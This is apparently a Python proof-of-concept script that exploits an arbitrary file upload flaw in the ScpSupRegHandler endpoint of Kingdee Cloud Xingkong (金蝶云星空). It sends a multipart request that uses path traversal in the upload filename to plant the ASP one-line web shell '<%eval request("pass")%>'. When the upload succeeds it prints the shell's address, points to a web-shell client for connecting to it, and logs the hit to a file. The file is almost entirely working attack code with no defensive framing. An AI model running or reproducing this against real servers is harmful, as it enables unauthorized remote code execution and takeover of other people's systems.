import requests
import time
import buter
import wirtefile

info = "金蝶云星空管理中心ScpSupRegHandler接口任意文件上传"
filename = f"./reps/{info}-"+str(time.strftime("%Y-%m-%d", time.localtime()))
poc = '/k3cloud/SRM/ScpSupRegHandler'
headers = {
        "User-Agent": "Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.192 Mobile Safari/537.36",
        "Content-Type": "multipart/form-data; boundary=fd18dd968b553715cbc5a1982526199b"
}

data = '''--fd18dd968b553715cbc5a1982526199b
Content-Disposition: form-data; name="FAtt"; filename="../../../../uploadfiles/80920.asp."
Content-Type: text/plain

<%eval request("pass")%>
--fd18dd968b553715cbc5a1982526199b
Content-Disposition: form-data; name="FID"

2023
--fd18dd968b553715cbc5a1982526199b
Content-Disposition: form-data; name="dbId_v"

.
--fd18dd968b553715cbc5a1982526199b--'''

def KingdeeScpSuRegHandler(url):
    try:
        reps = requests.post(url=url + poc, data=data, headers=headers, verify=False, timeout=5)
        if reps.status_code == 200 and '"IsSuccess": true' in reps.text:
            shell_path = url+"/k3cloud/uploadfiles/80920.asp"
            print(buter.colors.GREEN+  f"存在{info} url : {url} \nshell_path : {shell_path} use gsl def asp connect " + buter.colors.END)
            reptext = shell_path
            wirtefile.writefiles(filename,reptext)
        else:
            print(buter.colors.RED+ f"未发现{info} url : {url} " + buter.colors.END)
    except Exception as e:
        print(buter.colors.END+f"ERROR : {e}"+buter.colors.END)
